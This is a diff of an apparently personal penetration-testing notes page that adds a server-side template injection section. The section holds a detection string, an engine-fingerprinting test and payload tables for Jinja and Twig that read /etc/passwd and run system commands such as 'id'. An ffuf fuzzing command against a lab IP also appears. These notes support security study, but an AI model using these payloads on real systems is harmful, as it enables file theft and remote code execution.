@@ -761,6 +761,15 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
+  <a href="#tepmlate-engines" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tepmlate engines
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
   <a href="#exploitation_1" class="md-nav__link">
     <span class="md-ellipsis">
       Exploitation
@@ -773,6 +782,24 @@
   <a href="#test-string" class="md-nav__link">
     <span class="md-ellipsis">
       Test String
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jingapython" class="md-nav__link">
+    <span class="md-ellipsis">
+      Jinga(python)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#twigphp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Twig(PHP)
     </span>
   </a>
   
@@ -1426,6 +1453,15 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
+  <a href="#tepmlate-engines" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tepmlate engines
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
   <a href="#exploitation_1" class="md-nav__link">
     <span class="md-ellipsis">
       Exploitation
@@ -1438,6 +1474,24 @@
   <a href="#test-string" class="md-nav__link">
     <span class="md-ellipsis">
       Test String
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jingapython" class="md-nav__link">
+    <span class="md-ellipsis">
+      Jinga(python)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#twigphp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Twig(PHP)
     </span>
   </a>
   
@@ -1592,12 +1646,71 @@ ffuf -w ./ports.txt -u http://10.129.201.127/index.php -X POST -H &quot;Content-
 <li>LFI attempts may show different error messages for files that exist versus files that don't.</li>
 </ul>
 <h2 id="ssti">SSTI</h2>
+<h3 id="tepmlate-engines">Tepmlate engines</h3>
+<ul>
+<li><a href="https://jinja.palletsprojects.com/en/stable/">Jinga</a></li>
+<li><a href="https://twig.symfony.com/">Twig</a></li>
+</ul>
 <h3 id="exploitation_1">Exploitation</h3>
-<p>Templating Engines are used to dynamically generate content</p>
+<p>Templating Engines are used to dynamically generate content.</p>
 <h3 id="test-string">Test String</h3>
 <ul>
-<li><code>${{&lt;%[%'"}}%\.</code></li>
+<li><code>${{&lt;%[%'"}}%\.</code> Should result in an error message if the template is vulnerable.</li>
+<li>Follow the below tree looking to find when payload is executed successfully i.e. 7*7 returns 49.</li>
+<li>{{7*'7'}} will be 7777777 in Jinja, while in Twig, the result will be 49.</li>
 </ul>
+<p><img alt="Identifying Template Engine" src="..\images\identify-template.png" /></p>
+<h3 id="jingapython">Jinga(python)</h3>
+<table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>{{ config.items() }}</code></td>
+<td>Dump web app config file</td>
+</tr>
+<tr>
+<td><code>{{ self.__init__.__globals__.__builtins__ }}</code></td>
+<td>Dump built in functions</td>
+</tr>
+<tr>
+<td><code>{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}</code></td>
+<td>Use the python <code>open()</code> function to perform LFI</td>
+</tr>
+<tr>
+<td><code>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}</code></td>
+<td>Import the python <code>os</code> library to perform RCE</td>
+</tr>
+</tbody>
+</table>
+<h3 id="twigphp">Twig(PHP)</h3>
+<table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>{{ _self }}</code></td>
+<td>Dump a small amount of info about the current template</td>
+</tr>
+<tr>
+<td><code>{{ "/etc/passwd"\|file_excerpt(1,-1) }}</code></td>
+<td>Use the <code>file_excerpt()</code> function from the <a href="https://symfony.com/">Symfony</a> framework to perform LFI</td>
+</tr>
+<tr>
+<td><code>{{ ['id'] \| filter('system') }}</code></td>
+<td>RCE using twigs <code>filter()</code> function to pass arguments to <code>system</code> the built-in PHP function</td>
+</tr>
+</tbody>
+</table>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md">Payload all the things cheat sheet for other templates</a></p>
 <h2 id="ssi-injection-directives">SSI Injection - Directives</h2>
 <table>
 <thead>
